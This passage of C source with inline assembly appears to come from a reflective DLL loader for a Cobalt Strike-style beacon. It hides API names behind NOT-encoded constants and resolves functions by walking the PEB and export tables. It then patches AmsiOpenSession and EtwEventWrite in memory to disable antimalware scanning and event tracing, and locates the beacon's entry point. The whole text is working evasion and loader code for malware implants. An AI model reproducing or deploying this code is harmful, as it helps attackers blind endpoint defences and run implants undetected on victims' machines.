    // If the AMSI.DLL is not already loaded into process memory, use LoadLibraryA to load the imported module into memory
    if (amsi.dllBase == NULL){
        amsi.dllBase = (PVOID)pLoadLibraryA((char*)(amsiStr));
    }
    amsi.Export.Directory      = (void*)getExportDirectory((void*)amsi.dllBase);
    amsi.Export.AddressTable   = (void*)getExportAddressTable((void*)amsi.dllBase, amsi.Export.Directory);
    amsi.Export.NameTable      = (void*)getExportNameTable((void*)amsi.dllBase, amsi.Export.Directory);
    amsi.Export.OrdinalTable   = (void*)getExportOrdinalTable((void*)amsi.dllBase, amsi.Export.Directory);
    // char AmsiOpenSession[] = "AmsiOpenSession";
    char AmsiOpenSessionStr[] = "1#.4t.-4/.2u$42";
    // python reverse.py AmsiOpenSession   <--- Python Script from Vivek / Pentester Academy SLAE64 course
    // String length : 15
    //   noisseS : 6e6f6973736553
    //   nepOismA : 6e65704f69736d41
    __asm__(
        "mov rsi, %[AmsiOpenSessionStr] \n"
        "mov r8,  0xFF9190968C8C9AAC \n" // NOT noisseS : 6e6f6973736553
        "mov rdx, 0x919A8FB0968C92BE \n" // NOT nepOismA : 6e65704f69736d41
        "not rdx \n"
        "not r8 \n"
        "mov [rsi], rdx \n"
        "mov [rsi+0x8], r8 \n"
        : // no output
        :[AmsiOpenSessionStr] "r" (AmsiOpenSessionStr)
    );
    void* AmsiOpenSessionStrLen = (void*)15;
    void* pAmsiOpenSession  = getSymbolAddress(AmsiOpenSessionStr, AmsiOpenSessionStrLen, amsi.dllBase, amsi.Export.AddressTable, amsi.Export.NameTable, amsi.Export.OrdinalTable);
    SIZE_T bytesWritten;
    unsigned char amsibypass[] = { 0x48, 0x31, 0xC0 }; // xor rax, rax
    char WriteProcessMemoryStr[] = "g90.-13#5@3.-t3;5#9-.[3";
    // $ python reverse.py WriteProcessMemory
    // String length : 18
    //   yr : 7972
    //   omeMssec : 6f6d654d73736563
    //   orPetirW : 6f72506574697257
    __asm__(
        "mov rsi, %[WriteProcessMemoryStr] \n"
        "mov rcx, 0xFFFFFFFFFFFF868D \n" // NOT yr       : 7972
        "mov rdx, 0x90929AB28C8C9A9C \n" // NOT omeMssec : 6f6d654d73736563
        "mov r11, 0x908DAF9A8B968DA8 \n" // NOT orPetirW : 6f72506574697257
        "not rcx \n"
        "not r11 \n"
        "not rdx \n"
        "mov [rsi], r11 \n"
        "mov [rsi+0x8], rdx \n"
        "mov [rsi+0x10], rcx \n"
        : // no output
        :[WriteProcessMemoryStr] "r" (WriteProcessMemoryStr)
    );    
    tWriteProcessMemory pWriteProcessMemory = getSymbolAddress(WriteProcessMemoryStr, (PVOID)18, k32->dllBase, k32->Export.AddressTable, k32->Export.NameTable, k32->Export.OrdinalTable);
    pWriteProcessMemory((PVOID)-1, pAmsiOpenSession, (PVOID)amsibypass, sizeof(amsibypass), &bytesWritten);
    // ######### ETW.EtwEventWrite Bypass // Credit: @_xpn_ & @ajpc500 // https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/ & https://github.com/ajpc500/BOFs/blob/main/ETW/etw.c
    char EtwEventWriteStr[] = "f9#.^124.-.32";
    // python reverse.py EtwEventWrite
    // String length : 13
    //   etirW    : 6574697257
    //   tnevEwtE : 746e657645777445
    __asm__(
        "mov rsi, %[EtwEventWriteStr] \n"
        "mov r8,  0xFFFFFF9A8B968DA8 \n" // NOT etirW    : 6574697257
        "mov rdx, 0x8B919A89BA888BBA \n" // NOT tnevEwtE : 746e657645777445
        "not rdx \n"
        "not r8 \n"
        "mov [rsi], rdx \n"
        "mov [rsi+0x8], r8 \n"
        : // no output
        :[EtwEventWriteStr] "r" (EtwEventWriteStr)
    );
    PVOID EtwEventWriteStrLen = (PVOID)13;
    PVOID pEtwEventWrite  = getSymbolAddress(EtwEventWriteStr, EtwEventWriteStrLen, ntdll->dllBase, ntdll->Export.AddressTable, ntdll->Export.NameTable, ntdll->Export.OrdinalTable);
    unsigned char etwbypass[] = { 0xc3 }; // ret
    pWriteProcessMemory((PVOID)-1, pEtwEventWrite, (PVOID)etwbypass, sizeof(etwbypass), &bytesWritten);
    return;
}

__asm__(
"getRdllBase: \n"
    "call pop \n"       // Calling the next instruction puts RIP address on the top of our stack
    "pop: \n"
    "pop rcx \n"        // pop RIP into RCX
"dec1:"
    "xor rbx,rbx \n"    // Clear out RBX - were gonna use it for comparing if we are at start
    "mov ebx,0x5A4D \n" // "MZ" bytes for comparing if we are at the start of our reflective DLL
    "dec rcx \n"
    "cmp bx, word ptr ds:[rcx] \n" // Compare the first 2 bytes of the page to "MZ"
    "jne dec1 \n"            
    "xor rax, rax \n"
    "mov ax, [rcx+0x3C] \n" // IMAGE_DOS_HEADER-> LONG   e_lfanew;  // File address of new exe header
    "add rax, rcx \n"       // DLL base + RVA new exe header = 0x00004550 PE00 Signature
    "xor rbx,rbx \n"
    "add bx, 0x4550\n"      // PEOO
    "cmp bx, word ptr ds:[rax] \n" // Compare the 4 bytes to PE\0\0
    "jne dec1 \n"            
    "mov rax, rcx \n"       // Return the base address of our reflective DLL
    "ret \n"                // return initRdllAddr
"getDllBase: \n"
    "xor rax, rax \n"             // RAX = 0x0
// Check if dllName string is ASCII or Unicode
    "mov rcx, [rcx] \n"           // RCX = First 8 bytes of string 
"getMemList:"
    "mov rbx, gs:[rax+0x60] \n"   // RBX = ProcessEnvironmentBlock // GS = TEB
    "mov rbx, [rbx+0x18] \n"      // RBX = _PEB_LDR_DATA
    "mov rbx, [rbx+0x20] \n"      // RBX = InMemoryOrderModuleList - First Entry (probably the host PE File)
    "mov r11, rbx \n" 
"crawl: \n"
    "mov rax, [rbx+0x50] \n"      // RAX = BaseDllName Buffer - The actual Unicode bytes of the string (we skip the first 8 bytes of the _UNICODE_STRING struct to get the pointer to the buffer)
    "mov rax, [rax] \n"           // RAX = First 4 Unicode bytes of the DLL string from the Ldr List
    "cmp rax, rcx \n"
    "je found \n"
    "mov rbx, [rbx] \n"           // RBX = InMemoryOrderLinks Next Entry
    "cmp r11, [rbx] \n"           // Are we back at the same entry in the list?
    "jne crawl \n"
    "xor rax, rax \n"             // DLL is not in InMemoryOrderModuleList, return NULL
    "jmp end \n"
"found: \n"
    "mov rax, [rbx+0x20] \n" // [rbx+0x20] = DllBase Address in process memory
"end: \n"
    "ret \n"
"getExportDirectory: \n"
    "mov r8, rcx \n"
    "mov ebx, [rcx+0x3C] \n"
    "add rbx, r8 \n"
    "xor rcx, rcx \n"
    "add cx, 0x88 \n"
    "mov eax, [rbx+rcx] \n"
    "add rax, r8 \n"
    "ret \n" // return ExportDirectory;
"getExportAddressTable: \n"
    "xor rax, rax \n"
    "add rdx, 0x1C \n"         // DWORD AddressOfFunctions; // 0x1C offset // RDX = &RVAExportAddressTable
    "mov eax, [rdx] \n"        // RAX = RVAExportAddressTable (Value/RVA)
    "add rax, rcx \n"          // RAX = VA ExportAddressTable (The address of the Export table in running memory of the process)
    "ret \n" // return ExportAddressTable
"getExportNameTable: \n"
    "xor rax, rax \n"
    "add rdx, 0x20 \n"         // DWORD AddressOfFunctions; // 0x20 offset 
    "mov eax, [rdx] \n"        // RAX = RVAExportAddressOfNames (Value/RVA)
    "add rax, rcx \n"          // RAX = VA ExportAddressOfNames 
    "ret \n" // return ExportNameTable;
"getExportOrdinalTable: \n"
    "xor rax, rax \n"
    "add rdx, 0x24 \n"         // DWORD AddressOfNameOrdinals; // 0x24 offset 
    "mov eax, [rdx] \n"        // RAX = RVAExportAddressOfNameOrdinals (Value/RVA)
    "add rax, rcx \n"          // RAX = VA ExportAddressOfNameOrdinals 
    "ret \n" // return ExportOrdinalTable;
"getSymbolAddress: \n"
    "mov r10, [RSP+0x28] \n" // ExportNameTable
    "mov r11, [RSP+0x30] \n" // ExportOrdinalTable
    "xchg rcx, rdx \n"       // RCX = symbolStringSize & RDX =symbolString
    "push rcx \n"            // push str len to stack
    "xor rax, rax \n"
"loopFindSymbol: \n"
    "mov rcx, [rsp] \n"             // RCX/[RSP] = DWORD symbolStringSize (Reset string length counter for each loop)
    "xor rdi, rdi \n"               // Clear RDI for setting up string name retrieval
    "mov edi, [r10+rax*4] \n"       // EDI = RVA NameString = [&NamePointerTable + (Counter * 4)]
    "add rdi, r8 \n"                // RDI = &NameString    = RVA NameString + &module.dll
    "mov rsi, rdx \n"               // RSI = Address of API Name String to match on the Stack (reset to start of string)
    "repe cmpsb \n"                 // Compare strings at RDI & RSI
    "je FoundSymbol \n"             // If match then we found the API string. Now we need to find the Address of the API
    "inc rax \n"                    // Increment to check if the next name matches
    "jmp short loopFindSymbol \n"   // Jump back to start of loop
"FoundSymbol: \n"
    "pop rcx \n"                    // Remove string length counter from top of stack
    "mov ax, [r11+rax*2] \n"        // RAX = [&OrdinalTable + (Counter*2)] = ordinalNumber of module.<API>
    "mov eax, [r9+rax*4] \n"        // RAX = RVA API = [&AddressTable + API OrdinalNumber]
    "add rax, r8 \n"                // RAX = module.<API> = RVA module.<API> + module.dll BaseAddress
    "sub r11, rax \n"               // See if our symbol address is greater than the OrdinalTable Address. If so its a forwarder to a different API
    "jns isNotForwarder \n"         // If forwarder, result will be negative and Sign Flag is set (SF), jump not sign = jns
    "xor rax, rax \n"               // If forwarder, return 0x0 and exit
"isNotForwarder: \n"
    "ret \n"
"getNewExeHeader: \n"
    "xor rax, rax \n"
    "mov eax, [rcx+0x3C] \n"           // RBX = Offset NewEXEHeader
    "add rax, rcx \n"                  // RBX = &module.dll + Offset NewEXEHeader = &NewEXEHeader
    "ret \n" // return NewExeHeader;
"getDllSize: \n"
    "xor rbx, rbx \n"
    "mov ebx, [rcx+0x50] \n" // EBX = ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfImage
    "mov rax, rbx \n"
    "ret \n" // return dllSize;
    "getDllSizeOfHeaders: \n"
    "xor rbx, rbx \n"
    "mov ebx, [rax+0x54] \n" // ((PIMAGE_NT_HEADERS)newExeHeaderAddr)->OptionalHeader.SizeOfHeaders
    "mov rax, rbx \n"
    "ret \n" // return SizeOfHeaders;
"copyMemory: \n"
    "dec ecx \n"           // Decrement the counter
    "xor rbx, rbx \n"
    "mov bl, [rdx]  \n"    // Load the next byte to write into the BL register
    "mov [r8], bl \n"      // write the byte
    "inc rdx \n"           // move rdx to next byte of source 
    "inc r8 \n"            // move r8 to next byte of destination 
    "test rcx, rcx \n"     // check if rax = 0
    "jne copyMemory \n"    // if rax != 0, then write next byte via loop
    "ret \n"
"getOptionalHeader: \n"
    "add rcx, 0x18 \n"
    "xchg rax, rcx \n"
    "ret \n" // return OptionalHeader
"getSizeOfOptionalHeader: \n"
    "mov rax, rcx \n"
    "add rax, 0x14 \n"  // RAX = &FileHeader.SizeOfOptionalHeader
    "xor rbx, rbx \n"
    "mov bx, [rax] \n"  // RBX = Value of FileHeader.SizeOfOptionalHeader
    "mov rax, rbx \n"
    "ret \n" 
"getNthSection: \n"
    "add rcx, rdx \n"
    "mov rax, rcx \n"
    "ret \n" 
"getNumberOfSections: \n"
    "add rcx, 0x6 \n"  // RAX = &FileHeader.NumberOfSections
    "xor rax, rax \n"
    "mov ax, [rcx] \n"
    "ret \n" 
"getImportDirectory: \n"
    "xor rax, rax \n"
    "mov rax, 0x78 \n"
    "add rax, rcx \n"
    "ret \n" //return ImportDirectory 
"getBeaconEntryPoint: \n"
    "xor rbx, rbx \n"
    "mov rbx, 0x10 \n"
    "add rdx, rbx \n"       // OptionalHeader.AddressOfEntryPoint
    "mov eax, [rdx] \n"
    "add rax, rcx \n"       // newRdllAddr.EntryPoint
    "ret \n" // return newRdllAddrEntryPoint
);
